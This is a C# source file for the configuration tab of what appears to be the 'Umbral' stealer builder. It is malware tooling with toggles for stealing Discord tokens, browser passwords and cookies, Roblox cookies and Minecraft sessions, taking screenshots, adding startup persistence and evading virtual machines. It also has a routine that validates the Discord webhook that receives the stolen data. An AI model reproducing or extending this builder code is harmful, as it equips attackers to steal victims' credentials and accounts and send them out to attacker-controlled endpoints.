using System;
using System.Drawing;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace Umbral.builder.User_Controls
{
    public partial class GeneralTab : UserControl
    {

        public static bool IsWebhookValid;
        public static string Webhook;

        public static bool Ping;
        public static bool VmProtect;
        public static bool Startup;
        public static bool StealTokens;
        public static bool StealPasswords;
        public static bool StealCookies;
        public static bool StealRobloxCookies;
        public static bool StealMinecraftSession;
        public static bool TakeScreenshot;

        private const string WebhookPlaceholder = "https://discord.com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz";
        private const string WebhookCheckButtonPlaceHolderEnabled = "Check Webhook";
        private const string WebhookCheckButtonPlaceHolderDisabled = "Checking...";

        public GeneralTab()
        {
            InitializeComponent();
        }

        private void webhookLabel_Leave(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(webhookLabel.Text))
            {
                webhookLabel.Text = WebhookPlaceholder;
                webhookLabel.ForeColor = Color.Silver;
            }
        }

        private void webhookLabel_Enter(object sender, EventArgs e)
        {
            if (webhookLabel.Text == WebhookPlaceholder)
            {
                webhookLabel.Text = string.Empty;
                webhookLabel.ForeColor = SystemColors.Control;
            }
        }

        private void GeneralTab_Load(object sender, EventArgs e)
        {
            webhookLabel.Text = WebhookPlaceholder;
            webhookLabel.ForeColor = Color.Silver;
        }

        private async void WebhookCheckButton_Click(object sender, EventArgs e)
        {
            if (((Button)sender).Text == WebhookCheckButtonPlaceHolderDisabled)
                return;

            ((Button)sender).Text = WebhookCheckButtonPlaceHolderDisabled;
            if ((webhookLabel.Text.StartsWith("https://") || webhookLabel.Text.StartsWith("http://")) && webhookLabel.Text.Contains("discord") &&
                webhookLabel.Text.Contains("api/webhooks") && !webhookLabel.Text.Contains(" ") && !webhookLabel.Text.Equals(WebhookPlaceholder))
            {
                try
                {
                    using (HttpClient client = new HttpClient { Timeout = TimeSpan.FromSeconds(5.0) })
                    {
                        HttpResponseMessage response = await client.GetAsync(webhookLabel.Text);
                        response.EnsureSuccessStatusCode();
                    }

                    ((Button)sender).Text = WebhookCheckButtonPlaceHolderEnabled;
                    MessageBox.Show("Webhook seems to be working!", "Webhook Status", MessageBoxButtons.OK,
                        MessageBoxIcon.Information);
                    IsWebhookValid = true;
                    Webhook = webhookLabel.Text;
                }
                catch
                {
                    ((Button)sender).Text = WebhookCheckButtonPlaceHolderEnabled;
                    MessageBox.Show("Unable to connect to the webhook", "Webhook Status", MessageBoxButtons.OK,
                        MessageBoxIcon.Error);
                }
            }
            else
            {
                ((Button)sender).Text = WebhookCheckButtonPlaceHolderEnabled;
                MessageBox.Show("Invalid Webhook!", "Webhook Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void CheckBox_CheckChanged(object sender, EventArgs e)
        {
            CheckBox checkBox = (CheckBox)sender;

            if (checkBox.Checked)
            {
                checkBox.ForeColor = Color.Cyan;
            }
            else
            {
                checkBox.ForeColor = Color.White;
            }

            if (checkBox.Equals(PingCheckBox))
                Ping = checkBox.Checked;
            else if (checkBox.Equals(StartupCheckBox))
                Startup = checkBox.Checked;
            else if (checkBox.Equals(VmProtectCheckBox))
                VmProtect = checkBox.Checked;
            else if (checkBox.Equals(StealTokensCheckBox))
                StealTokens = checkBox.Checked;
            else if (checkBox.Equals(StealPasswordsCheckBox))
                StealPasswords = checkBox.Checked;
            else if (checkBox.Equals(StealCookiesCheckBox))
                StealCookies = checkBox.Checked;
            else if(checkBox.Equals(StealRobloxCookiesCheckBox))
                StealRobloxCookies = checkBox.Checked;
            else if (checkBox.Equals(StealMinecraftSessionCheckBox))
                StealMinecraftSession = checkBox.Checked;
            else if (checkBox.Equals(TakeScreenshotCheckBox))
                TakeScreenshot = checkBox.Checked;
        }

        private void webhookLabel_TextChanged(object sender, EventArgs e)
        {
            IsWebhookValid = false;
        }
    }
}
